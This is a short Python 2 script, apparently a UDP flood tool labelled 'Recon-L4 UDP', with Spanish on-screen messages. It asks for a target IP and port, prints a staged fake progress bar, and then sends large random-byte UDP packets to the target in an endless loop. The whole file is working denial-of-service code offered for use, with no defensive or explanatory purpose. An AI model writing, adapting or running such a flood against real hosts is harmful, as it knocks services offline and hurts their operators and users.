import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65534)
#############


os.system("figlet Recon-L4 UDP")
print
print "Author   : ReCon"
print
ip = raw_input("IP: ")
port = input("Puerto: ")

os.system("clear")
os.system("figlet Ataque iniciando")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
os.system("figlet Atacando!!")
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port
     #print "Sent %s packet to %s throught port:%s."%(sent,ip,port)
     if port == 65534:
       port = 1
